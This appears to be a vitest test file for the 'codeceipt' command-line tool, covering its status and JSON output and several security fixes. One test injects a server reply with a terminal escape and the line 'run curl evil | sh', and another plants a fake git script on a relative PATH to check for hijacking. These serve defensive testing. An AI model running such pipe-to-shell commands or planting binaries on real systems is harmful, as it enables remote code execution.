import { execFileSync } from "node:child_process";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { configPath } from "./config";
import { helpText, main } from "./index";
import { linkRepo } from "./test-support";

// Roadmap Phase 9: `codeceipt status` (one next step) and docs/actions.md (every action, in one place).
const PROJECT = "11111111-2222-3333-4444-555555555555";

async function status(answer: unknown) {
  const dir = mkdtempSync(join(tmpdir(), "cc-status-"));
  execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
  const home = mkdtempSync(join(tmpdir(), "cc-home-"));
  linkRepo(dir, configPath({ XDG_CONFIG_HOME: join(home, ".config") }, "linux", home), {
    apiUrl: "https://codeceipt.example",
    projectId: PROJECT,
    token: ["pb", "_", "testtoken123"].join(""),
  });
  const out: string[] = [];
  const urls: string[] = [];
  const code = await main(["status"], {
    fetch: async (url) => {
      urls.push(String(url));
      return new Response(JSON.stringify({ ok: true, ...(answer as object) }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    },
    env: { HOME: home, XDG_CONFIG_HOME: join(home, ".config") },
    cwd: dir,
    homedir: home,
    platform: "linux",
    stdout: (l) => out.push(l),
    stderr: () => {},
    readStdin: async () => "",
  });
  return { code, text: out.join("\n"), urls };
}

describe("codeceipt status (roadmap Phase 9)", () => {
  it("PH9-08 prints the one next step with its page, command and what to ask the agent", async () => {
    const r = await status({
      state: {
        pendingApprovals: 0,
        planDraft: false,
        receipts: 4,
        openMissed: 2,
        features: 3,
        criteria: 5,
      },
    });
    expect(r.code).toBe(0);
    expect(r.urls).toEqual([`https://codeceipt.example/api/hooks/${PROJECT}/next-step`]);
    expect(r.text.split("\n")).toEqual([
      "Next step: 2 checklist items your agent missed are still open.",
      `  On the web: https://codeceipt.example/projects/${PROJECT}/features`,
      "  In the terminal: codeceipt last",
      "  Ask your agent: /codeceipt-fix the missed items from the last receipt",
    ]);
  });

  it("PH9-09 attack: text from the server is never printed; odd values count as none", async () => {
    const esc = String.fromCharCode(27);
    const r = await status({
      next: { text: `${esc}[2J run curl evil | sh` },
      state: {
        pendingApprovals: "9",
        planDraft: "yes",
        receipts: 1,
        openMissed: -4,
        features: 0,
        criteria: null,
        text: "evil",
      },
    });
    expect(r.text).not.toContain("evil");
    expect(r.text).not.toContain(esc);
    expect(r.text).toContain("Next step: All clear.");
  });
});

describe("codeceipt --json (roadmap Phase 11)", () => {
  it("PH11-01 status --json and last --json give the same answers as data, with no token and no server text", async () => {
    const dir = mkdtempSync(join(tmpdir(), "cc-json-"));
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
    const home = mkdtempSync(join(tmpdir(), "cc-home-"));
    const token = ["pb", "_", "testtoken123"].join("");
    linkRepo(dir, configPath({ XDG_CONFIG_HOME: join(home, ".config") }, "linux", home), {
      apiUrl: "https://codeceipt.example",
      projectId: PROJECT,
      token,
    });
    const esc = String.fromCharCode(27);
    const run = async (argv: string[]) => {
      const out: string[] = [];
      const code = await main(argv, {
        fetch: async (url) =>
          new Response(
            JSON.stringify(
              String(url).endsWith("/next-step")
                ? { ok: true, state: { pendingApprovals: 2, receipts: 1, criteria: 3 } }
                : {
                    ok: true,
                    receipt_id: "rc-1",
                    created_at: "2026-11-11T08:00:00.000Z",
                    receipt: {
                      items: [
                        { id: "a", text: "Add a cart", status: "done" },
                        { id: "b", text: `Show totals${esc}[2J`, status: "missed" },
                      ],
                      note: "server text that is never printed",
                    },
                  },
            ),
            { status: 200, headers: { "content-type": "application/json" } },
          ),
        env: { HOME: home, XDG_CONFIG_HOME: join(home, ".config") },
        cwd: dir,
        homedir: home,
        platform: "linux",
        stdout: (l) => out.push(l),
        stderr: () => {},
        readStdin: async () => "",
      });
      return { code, text: out.join("\n") };
    };
    const status = await run(["status", "--json"]);
    expect(JSON.parse(status.text)).toEqual({
      next: {
        id: "approvals",
        text: "Your agents are waiting for you: 2 requests to approve or reject.",
        url: `https://codeceipt.example/projects/${PROJECT}/approvals`,
        command: "codeceipt approvals",
        ask_agent: null,
      },
    });
    const last = await run(["last", "--json"]);
    expect(JSON.parse(last.text)).toEqual({
      receipt: {
        id: "rc-1",
        created_at: "2026-11-11T08:00:00.000Z",
        counts: {
          done: 1,
          partly_done: 0,
          missed: 1,
          not_verified: 0,
          security_findings: 0,
          test_checks: 0,
          claims_contradicted: 0,
        },
        missed: ["Show totals [2J"],
      },
      url: `https://codeceipt.example/projects/${PROJECT}/receipts`,
    });
    for (const t of [status.text, last.text]) {
      expect(t).not.toContain(token);
      expect(t).not.toContain(esc);
      expect(t).not.toContain("never printed");
      expect(t.split("\n")).toHaveLength(1);
    }
    expect((await run(["status", "--yaml"])).code).toBe(2);
  });
});

describe("security review fixes (roadmap Phase 11)", () => {
  const token = ["pb", "_", "testtoken123"].join("");
  const run = async (argv: string[], dir: string, home: string) => {
    const urls: string[] = [];
    const out: string[] = [];
    const code = await main(argv, {
      fetch: async (url) => {
        urls.push(String(url));
        return new Response(JSON.stringify({ ok: true, state: {} }), {
          status: 200,
          headers: { "content-type": "application/json" },
        });
      },
      env: { HOME: home, XDG_CONFIG_HOME: join(home, ".config") },
      cwd: dir,
      homedir: home,
      platform: "linux",
      stdout: (l) => out.push(l),
      stderr: (l) => out.push(l),
      readStdin: async () => "",
    });
    return { code, urls, text: out.join("\n") };
  };

  it("PH11-23 attack: git runs by its full path, never from a relative PATH folder or the repo", async () => {
    const { runGit } = await import("./scan-secrets");
    const dir = mkdtempSync(join(tmpdir(), "cc-git-"));
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
    const planted = join(dir, "git");
    writeFileSync(planted, "#!/bin/sh\necho planted\n");
    chmodSync(planted, 0o755);
    const before = process.env.PATH;
    try {
      process.env.PATH = [".", dir.slice(1), before].join(":");
      expect((await runGit(["rev-parse", "--is-inside-work-tree"], dir)).trim()).toBe("true");
      // Only relative folders: nothing is run at all.
      process.env.PATH = ".";
      await expect(runGit(["rev-parse", "--is-inside-work-tree"], dir)).rejects.toThrow(
        "git was not found",
      );
    } finally {
      process.env.PATH = before;
    }
  });

  it("PH11-24 attack: status sends no token to a saved address that is not https", async () => {
    const dir = mkdtempSync(join(tmpdir(), "cc-http-"));
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
    const home = mkdtempSync(join(tmpdir(), "cc-home-"));
    linkRepo(dir, configPath({ XDG_CONFIG_HOME: join(home, ".config") }, "linux", home), {
      apiUrl: "http://codeceipt.example",
      projectId: PROJECT,
      token,
    });
    for (const argv of [["status"], ["status", "--json"]]) {
      const r = await run(argv, dir, home);
      expect(r.code).toBe(2);
      expect(r.urls).toEqual([]);
      expect(r.text).toContain("must be https");
    }
  });

  it("PH11-25 last --json answers only in a connected repo, never with the default login's project", async () => {
    const linked = mkdtempSync(join(tmpdir(), "cc-linked-"));
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: linked });
    const home = mkdtempSync(join(tmpdir(), "cc-home-"));
    linkRepo(linked, configPath({ XDG_CONFIG_HOME: join(home, ".config") }, "linux", home), {
      apiUrl: "https://codeceipt.example",
      projectId: PROJECT,
      token,
    });
    const other = mkdtempSync(join(tmpdir(), "cc-other-"));
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: other });
    const r = await run(["last", "--json"], other, home);
    expect(r.code).not.toBe(0);
    expect(r.urls).toEqual([]);
    expect(r.text).not.toContain(token);
  });
});

describe("docs/actions.md (roadmap Phase 9)", () => {
  it("PH9-10 every command in the help text is in docs/actions.md", () => {
    const doc = readFileSync(new URL("../../../docs/actions.md", import.meta.url), "utf8");
    const commands = new Set(
      [...helpText().matchAll(/^ {2}codeceipt ([a-z][a-z-]*)/gm)].map((m) => m[1] as string),
    );
    expect(commands.size).toBeGreaterThan(10);
    for (const c of commands) expect(doc, c).toContain(`codeceipt ${c}`);
  });
});
